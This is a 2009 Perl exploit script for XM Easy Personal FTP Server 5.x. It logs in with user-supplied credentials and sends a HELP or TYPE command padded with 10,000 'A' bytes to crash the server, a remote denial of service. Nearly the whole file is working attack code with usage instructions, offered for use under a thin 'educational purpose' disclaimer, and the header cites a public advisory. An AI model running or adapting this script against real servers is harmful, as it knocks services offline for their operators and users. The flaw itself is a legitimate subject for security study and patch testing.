#!usr/bin/perl -w

#######################################################################################
#   XM Easy Personal FTP Server 5.x allows remote attackers to cause a denial of service
#   via a "HELP" or "TYPE" command with an overly long argument.
#   Refer:
#                                                                                                       http://secunia.com/advisories/35271/
#        Original advisory avaiable at:
http://securitygyan.com/2009/06/09/xm-easy-personal-ftp-server-help-and-type-command-rdos-exploit/
#                 Product link: http://www.dxm2008.com/
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#        Author:    Vinod Sharma
#        Email:     vinodsharma[underscore]mimit[at]gmail.com
#        Blog:       http://securitygyan.com/
#        Date:      09th june, 2009
#
#
###Thanks all the Security Folks###
########################################################################################

use IO::Socket;

my $server_ip=$ARGV[0];
my $server_port=$ARGV[1];
my $username=$ARGV[2];
my $password=$ARGV[3];
my $command=$ARGV[4];
my $buffer=$command ." " ."\x41" x 10000 ."\r\n";

if(($#ARGV + 1)!=5)
{
                                print "\nUsage: XM_FTP_Serv_Exploit.pl server_ip_address server_port username password command\n";
                                print "\nargument command can have a value HELP or TYPE\n";
                                print "\nExample: XM_FTP_Serv_Exploit.pl 192.16.16.8 21 anonymous 123456 HELP";
                                
                                exit;
}
                                

$socket = new IO::Socket::INET (PeerAddr  =>$server_ip,  PeerPort  => $server_port, Proto => 'tcp',
)   or die "Couldn't connect to Server\n";


while (1)
{
        
    $socket->recv($recv_data,1024);
    print "RECIEVED: $recv_data";

        $send_data1 ="USER ".$username."\r\n";
    $socket->send($send_data1);
    $socket->recv($recv_data1,1024);
    print "RECIEVED: $recv_data1";
        
           $send_data2 ="PASS ".$password."\r\n";
       $socket->send($send_data2);
           $socket->recv($recv_data2,1024);
        print "RECIEVED: $recv_data2";
                
                
       $socket->send($buffer);
           print "\nAttack is send.....................\n";
           $socket->recv($recv_data3,1024);
        print "RECIEVED: $recv_data3";

                close $socket;

  }